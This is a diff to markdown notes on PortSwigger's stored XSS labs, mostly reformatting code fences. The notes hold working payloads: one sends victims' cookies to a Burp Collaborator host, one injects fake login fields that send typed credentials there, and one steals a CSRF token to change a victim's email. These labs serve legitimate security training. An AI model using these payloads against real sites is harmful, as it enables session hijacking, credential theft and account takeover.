@@ -477,14 +477,14 @@ This lab contains a [stored XSS](https://portswigger.net/web-security/cross-sit
 90. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
 91. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
     
-    ```
+    ```javascript
     <script>
      
     fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie });
     
     </script>
-``
-    
+    ```
+ 
 This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
 
 92. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
@@ -498,7 +498,7 @@ This lab contains a [stored XSS](https://portswigger.net/web-security/cross-sit
 95. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
 96. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
 97. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
-```
+```javascript
    <input name=username id=username> 
   <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
 ```
@@ -559,9 +559,8 @@ This lab contains a [stored XSS](https://portswigger.net/web-security/cross-sit
     - You need to issue a POST request to `/my-account/change-email`, with a parameter called `email`.
     - There's an anti-CSRF token in a hidden input called `token`.This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
 103. Submit the following payload in a blog comment:
-    
-    ```
-    `<script>
+```javascript
+    <script>
     
      var req = new XMLHttpRequest();
      req.onload = handleResponse;
@@ -573,11 +572,10 @@ This lab contains a [stored XSS](https://portswigger.net/web-security/cross-sit
      changeReq.open('post', '/my-account/change-email', true); 
      changeReq.send('csrf='+token+'&email=test@test.com') };
     
-     </script>`
-``
-    
-This will make anyone who views the comment issue a POST request to change their email address to `test@test.com`.
+     </script>
+```
 
+This will make anyone who views the comment issue a POST request to change their email address to `test@test.com`.
 	![[Pasted image 20240915033546.png]]
 		![[Pasted image 20240915033425.png]]
 
